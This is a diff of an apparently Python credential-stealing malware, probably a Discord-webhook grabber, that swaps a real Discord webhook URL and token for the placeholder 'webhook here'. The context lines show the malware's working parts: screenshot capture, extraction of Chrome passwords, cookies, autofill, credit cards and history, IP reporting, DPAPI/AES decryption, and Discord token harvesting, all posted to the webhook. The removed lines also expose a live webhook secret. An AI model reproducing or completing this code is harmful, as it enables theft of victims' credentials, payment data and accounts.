@@ -19,7 +19,7 @@ from discord_webhook import DiscordWebhook
 # taking ss
 
 # Configura el webhook URL
-webhook_url = 'https://discord.com/api/webhooks/1118936905933930577/GtATFqUY4pNJ6DrQdlycpYiMZGHmL19hPJIn8GXoFJbrmTiBjFTrc33JHWjPTyrnw4ff'
+webhook_url = 'webhook here'
 
 # Captura la pantalla y guarda la imagen en la carpeta temporal del sistema
 screenshot = pyautogui.screenshot()
@@ -227,7 +227,7 @@ if __name__ == "__main__":
      chrome.history()
      chrome.web_data()
      files = ["passwords.txt", "cookies.txt", "autofill.txt", "credit_cards.txt", "search_history.txt", "web_history.txt"]
-     send_files_to_discord("https://discord.com/api/webhooks/1118936905933930577/GtATFqUY4pNJ6DrQdlycpYiMZGHmL19hPJIn8GXoFJbrmTiBjFTrc33JHWjPTyrnw4ff", files)
+     send_files_to_discord("webhook here", files)
 
 
 
@@ -255,7 +255,7 @@ data = {
  }
 
  # Discord webhook URL
-webhook_url = "https://discord.com/api/webhooks/1118936905933930577/GtATFqUY4pNJ6DrQdlycpYiMZGHmL19hPJIn8GXoFJbrmTiBjFTrc33JHWjPTyrnw4ff"
+webhook_url = "webhook here"
 
  # Send the data to the Discord webhook
 response = requests.post(webhook_url, json=data)
@@ -285,14 +285,14 @@ def send_ip_to_discord(webhook_url, ip_address):
      else:
          print('Checking for updates...')
 # Set your Discord webhook URL
-webhook_url = 'https://discord.com/api/webhooks/1118936905933930577/GtATFqUY4pNJ6DrQdlycpYiMZGHmL19hPJIn8GXoFJbrmTiBjFTrc33JHWjPTyrnw4ff'
+webhook_url = 'webhook here'
 
 # Get IP address and send it to Discord
 ip_address = get_ip_address()
 send_ip_to_discord(webhook_url, ip_address)
  #cookies
  # another sh
-webhook = "https://discord.com/api/webhooks/1118936905933930577/GtATFqUY4pNJ6DrQdlycpYiMZGHmL19hPJIn8GXoFJbrmTiBjFTrc33JHWjPTyrnw4ff" # WEBHOOK HERE
+webhook = "webhook here" # WEBHOOK HERE
 
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES 
@@ -485,7 +485,7 @@ from shutil import copyfile
 from sys import argv
 
 # CONFIG -> Setup before compiling
-url= "https://discord.com/api/webhooks/1118936905933930577/GtATFqUY4pNJ6DrQdlycpYiMZGHmL19hPJIn8GXoFJbrmTiBjFTrc33JHWjPTyrnw4ff" #Paste Discord Webhook url
+url= "webhook here" #Paste Discord Webhook url
 
 
 
@@ -848,7 +848,7 @@ import os
 import re
 import json
 from urllib.request import Request, urlopen
-WEBHOOK = 'https://discord.com/api/webhooks/1118936905933930577/GtATFqUY4pNJ6DrQdlycpYiMZGHmL19hPJIn8GXoFJbrmTiBjFTrc33JHWjPTyrnw4ff'
+WEBHOOK = 'webhook here'
 PING_ME = True
 def find_tokens(path):
     path += '\Local Storage\leveldb'
